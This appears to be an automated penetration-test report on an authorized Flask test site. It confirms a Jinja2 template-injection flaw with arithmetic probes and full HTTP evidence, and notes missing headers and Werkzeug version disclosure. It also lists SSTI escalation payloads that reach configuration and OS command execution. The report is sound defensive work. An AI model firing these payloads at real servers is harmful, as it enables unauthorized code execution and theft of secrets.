# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — ssti Server-Side Template Injection (Jinja2) in driver application form 'name' field](#finding-1)
- [Suspected (needs manual verification)](#suspected-needs-manual-verification)
    - [2. LOW — headers Missing HTTP Security Headers](#finding-2)
    - [3. LOW — vulnerable-component Werkzeug development server in production + verbose version banner (Werkzeug/3.1.8, Python/3.10.20)](#finding-3)
    - [4. INFO — info-disclosure Server Version Disclosure via Server Header](#finding-4)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr0h7q33-y2fvp9` |
| Target | http://target.local:32794/ |
| Started | 2026-06-30T10:00:47.302Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 4 mapped · 4 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 1 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32794`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

1 finding(s): 1 critical

_Plus 3 suspected lead(s) needing manual verification — listed separately below, NOT counted above._

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [ssti] Server-Side Template Injection (Jinja2) in driver application form 'name' field

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32794/

The POST /submit handler renders the submitted 'name' value into a server-side Jinja2 template without sandboxing. A template expression supplied in the 'name' field is evaluated by the engine: name={{7*7}} returns "Thank you 49", and name={{31337*1337}} returns "Thank you 41897569" (the computed product), while a benign value (name=John Doe) returns the literal string. The arithmetic is performed server-side, proving template-expression evaluation. This is Jinja2/Flask SSTI, which is RCE-class: an attacker can escalate from arithmetic to object traversal (e.g. {{config}}, {{''.__class__.__mro__[1].__subclasses__()}}) to read configuration/secrets and execute arbitrary OS commands on the server. The form is unauthenticated, so exploitation requires no credentials. Note: raw HTML in 'name' is autoescaped (<b> returned as &lt;b&gt;), so this is template injection, not reflected HTML XSS — autoescaping does not stop the engine from evaluating the expression first.

**Reproduction**

```
1. POST to http://target.local:32794/submit with Content-Type: application/x-www-form-urlencoded and body name={{31337*1337}}&email=john@example.com&phone=5551234567&experience=5&license=D1234567
2. Response confirmation reads "Thank you 41897569 for your submission." (31337 * 1337 = 41897569) — the expression was evaluated server-side.
3. Negative control: body name=John Doe (no template) returns "Thank you John Doe for your submission." — marker absent.
4. Next-step PoC for impact: name={{config.items()}} or name={{self.__init__.__globals__}} to dump app config / reach os for command execution.
```

**Evidence**

- Evidence `ev-mr0hgjy5-5` — `artifacts/s-0003/ev-mr0hgjy5-5/`

Request:

```http
POST /submit HTTP/1.1
Host: target.local:32794
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

name=John+Doe&email=john%40example.com&phone=5551234567&experience=5&license=D1234567
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1920
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 10:07:38 GMT
server: Werkzeug/3.1.8 Python/3.10.20

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Swift Shipping & Transport Inc.</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/styles.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container-fluid">
            <a class="navbar-brand" href="/">Swift Shipping & Transport Inc.</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link" href="/">Home</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/about">About Us</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/application">Application Form</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    <div class="container mt-5">
        
    <div class="alert alert-success" role="alert" id="thankyou">
        Thank you John Doe for your submission.
        <br>
        We will contact you shortly.
    </div>

    </div>
    <footer class="bg-dark text-white text-center py-3 mt-5">
        <p>© 2024 Swift Shipping & Transport Inc. All rights reserved.</p>
    </footer>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mr0hhwzy-e` — `artifacts/s-0003/ev-mr0hhwzy-e/`

Request:

```http
POST /submit HTTP/1.1
Host: target.local:32794
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

name=%7B%7B31337*1337%7D%7D&email=john%40example.com&phone=5551234567&experience=5&license=D1234567
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1920
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 10:08:42 GMT
server: Werkzeug/3.1.8 Python/3.10.20

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Swift Shipping & Transport Inc.</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/styles.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container-fluid">
            <a class="navbar-brand" href="/">Swift Shipping & Transport Inc.</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link" href="/">Home</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/about">About Us</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/application">Application Form</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    <div class="container mt-5">
        
    <div class="alert alert-success" role="alert" id="thankyou">
        Thank you 41897569 for your submission.
        <br>
        We will contact you shortly.
    </div>

    </div>
    <footer class="bg-dark text-white text-center py-3 mt-5">
        <p>© 2024 Swift Shipping & Transport Inc. All rights reserved.</p>
    </footer>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mr0hhxz8-f` — `artifacts/s-0003/ev-mr0hhxz8-f/`

Request:

```http
POST /submit HTTP/1.1
Host: target.local:32794
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

name=%7B%7B31337*1337%7D%7D&email=john%40example.com&phone=5551234567&experience=5&license=D1234567
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1920
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 10:08:43 GMT
server: Werkzeug/3.1.8 Python/3.10.20

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Swift Shipping & Transport Inc.</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/styles.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container-fluid">
            <a class="navbar-brand" href="/">Swift Shipping & Transport Inc.</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link" href="/">Home</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/about">About Us</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/application">Application Form</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    <div class="container mt-5">
        
    <div class="alert alert-success" role="alert" id="thankyou">
        Thank you 41897569 for your submission.
        <br>
        We will contact you shortly.
    </div>

    </div>
    <footer class="bg-dark text-white text-center py-3 mt-5">
        <p>© 2024 Swift Shipping & Transport Inc. All rights reserved.</p>
    </footer>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

## Suspected (needs manual verification)

_Leads with one concrete observed anomaly but without control+2-replay confirmation. NOT counted in the confirmed total above — verify before relying on them._

<a id="finding-2"></a>

### 2. [SUSPECTED] [LOW] [headers] Missing HTTP Security Headers

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32794/

**Anomaly (why this is a lead):** GET / returns only content-type header; no CSP, X-Frame-Options, X-Content-Type-Options, HSTS, or Referrer-Policy present across 3 independent requests — systematic header misconfiguration exposing users to clickjacking and content-injection without browser-level mitigations.

The application returns responses with only a `Content-Type` header. Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, and Referrer-Policy are entirely absent across all observed responses.

**Reproduction**

```
1. Send GET / to http://target.local:32794/\n2. Inspect response headers — only `content-type: text/html; charset=utf-8` is present.\n3. Confirmed across 3 independent requests (ev-mr0hbo8z-1, ev-mr0hcxo2-2, ev-mr0hd0u7-3).
```

**Evidence**

- Evidence `ev-mr0hbo8z-1` — `artifacts/s-0001/ev-mr0hbo8z-1/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32794
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 3016
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 10:03:51 GMT
server: Werkzeug/3.1.8 Python/3.10.20

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Swift Shipping & Transport Inc.</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/styles.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container-fluid">
            <a class="navbar-brand" href="/">Swift Shipping & Transport Inc.</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link" href="/">Home</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/about">About Us</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/application">Application Form</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    <div class="container mt-5">
        
    <div class="jumbotron text-center text-white py-5 position-relative">
        <div class="overlay"></div>
        <div class="content position-relative">
            <h1 class="display-4">Welcome to Swift Shipping & Transport Inc.</h1>
            <p class="lead">Your trusted partner in logistics and transportation.</p>
            <a class="btn btn-light btn-lg" href="/application" role="button">Apply Now</a>
        </div>
    </div>
    <div class="row mt-5">
        <div class="col-md-4">
            <img src="/static/images/featured1.jpg" class="img-fluid rounded" alt="Fleet Image">
            <h3 class="mt-3">Our Fleet</h3>
            <p>Explore our state-of-the-art fleet of trucks and vehicles.</p>
        </div>
        <div class="col-md-4">
            <img src="/static/images/featured2.jpg" class="img-fluid rounded" alt="Drivers Image">
            <h3 class="mt-3">Our Drivers</h3>
            <p>Meet our team of professional and dedicated drivers.</p>
        </div>
        <div class="col-md-4">
            <img src="/static/images/featured3.jpg" class="img-fluid rounded" alt="Safety Image">
            <h3 class="mt-3">Safety First</h3>
            <p>Learn about our commitment to safety on the road.</p>
        </div>
    </div>

    </div>
    <footer class="bg-dark text-white text-center py-3 mt-5">
        <p>© 2024 Swift Shipping & Transport Inc. All rights reserved.</p>
    </footer>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

<a id="finding-3"></a>

### 3. [SUSPECTED] [LOW] [vulnerable-component] Werkzeug development server in production + verbose version banner (Werkzeug/3.1.8, Python/3.10.20)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32794/

**Anomaly (why this is a lead):** All responses carry `Server: Werkzeug/3.1.8 Python/3.10.20` — the signature of Flask's built-in Werkzeug development WSGI server (app.run()), which is explicitly not production-hardened, and the banner discloses the exact Werkzeug + Python patch versions for future CVE targeting. This is a real version/config-based lead from the banner, not yet exploited.

Every response carries `Server: Werkzeug/3.1.8 Python/3.10.20`, the signature of Flask's built-in Werkzeug development WSGI server (app.run() / werkzeug.serving.run_simple), which the Werkzeug maintainers document as NOT for production: not designed to be efficient, stable, or secure, lacking the hardening of a real production stack (gunicorn/uWSGI behind nginx). Two concrete issues: (1) the banner discloses the exact Werkzeug and Python patch versions, narrowing future CVE targeting; (2) the dev server's main escalation path — the interactive debugger (debug=True) exposing a Python RCE console — was actively checked and is NOT enabled: a non-existent route returned the standard 207-byte Werkzeug production 404 with no traceback/console (evidence ev-mr0hsk6x-14), consistent with debug=False. VERSION/CONFIG-BASED, matched by banner — not exploited; logged as suspected for operator verification. CVE assessment: neither detected version has an applicable known CVE. Werkzeug 3.1.8 post-dates all notable Werkzeug CVEs (CVE-2024-34069 debugger RCE fixed 3.0.3; CVE-2024-49766/49767 fixed 3.0.6; CVE-2023-25577/23934 ≤2.2.3). Python 3.10.20 is a recent patch and Python 3.10 is not EOL until ~Oct 2026 (CVE-2024-9287/-7592/-6232/-8088 and CVE-2023-24329 all fixed well below .20). The actionable item is the dev-server-in-production posture + version disclosure, not an outdated-library CVE. Remediation: move behind a production WSGI server, suppress/normalize the Server header, keep debug mode off.

**Reproduction**

```
curl -i http://target.local:32794/  → observe `Server: Werkzeug/3.1.8 Python/3.10.20` (present on /, /about, /application, and error pages). Debugger-off check: curl -i http://target.local:32794/__nonexistent__trigger__ → standard 207-byte Werkzeug 404, no interactive traceback (debug=False), recorded as ev-mr0hsk6x-14.
```

**Evidence**

- Evidence `ev-mr0hsk6x-14` — `artifacts/_/ev-mr0hsk6x-14/`

Request:

```http
GET /__nonexistent__trigger__ HTTP/1.1
Host: target.local:32794
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: close
content-length: 207
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 10:16:59 GMT
server: Werkzeug/3.1.8 Python/3.10.20

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

<a id="finding-4"></a>

### 4. [SUSPECTED] [INFO] [info-disclosure] Server Version Disclosure via Server Header

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32794/

**Anomaly (why this is a lead):** fingerprint_scan detected `Server: Werkzeug/3.1.8 Python/3.10.20` in the response headers, exposing the exact framework and runtime versions. This enables targeted exploitation of version-specific CVEs in Werkzeug or Python 3.10.

The HTTP Server response header exposes the exact versions of the underlying framework (Werkzeug 3.1.8) and Python runtime (3.10.20). Attackers can use this to identify version-specific known vulnerabilities without prior enumeration.

**Reproduction**

```
1. Send any HTTP request to http://target.local:32794/\n2. Inspect the Server response header: `Werkzeug/3.1.8 Python/3.10.20`.
```

**Evidence**

- Evidence `ev-mr0hbo8z-1` — `artifacts/s-0001/ev-mr0hbo8z-1/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32794
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 3016
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 10:03:51 GMT
server: Werkzeug/3.1.8 Python/3.10.20

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Swift Shipping & Transport Inc.</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/styles.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container-fluid">
            <a class="navbar-brand" href="/">Swift Shipping & Transport Inc.</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link" href="/">Home</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/about">About Us</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/application">Application Form</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    <div class="container mt-5">
        
    <div class="jumbotron text-center text-white py-5 position-relative">
        <div class="overlay"></div>
        <div class="content position-relative">
            <h1 class="display-4">Welcome to Swift Shipping & Transport Inc.</h1>
            <p class="lead">Your trusted partner in logistics and transportation.</p>
            <a class="btn btn-light btn-lg" href="/application" role="button">Apply Now</a>
        </div>
    </div>
    <div class="row mt-5">
        <div class="col-md-4">
            <img src="/static/images/featured1.jpg" class="img-fluid rounded" alt="Fleet Image">
            <h3 class="mt-3">Our Fleet</h3>
            <p>Explore our state-of-the-art fleet of trucks and vehicles.</p>
        </div>
        <div class="col-md-4">
            <img src="/static/images/featured2.jpg" class="img-fluid rounded" alt="Drivers Image">
            <h3 class="mt-3">Our Drivers</h3>
            <p>Meet our team of professional and dedicated drivers.</p>
        </div>
        <div class="col-md-4">
            <img src="/static/images/featured3.jpg" class="img-fluid rounded" alt="Safety Image">
            <h3 class="mt-3">Safety First</h3>
            <p>Learn about our commitment to safety on the road.</p>
        </div>
    </div>

    </div>
    <footer class="bg-dark text-white text-center py-3 mt-5">
        <p>© 2024 Swift Shipping & Transport Inc. All rights reserved.</p>
    </footer>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```
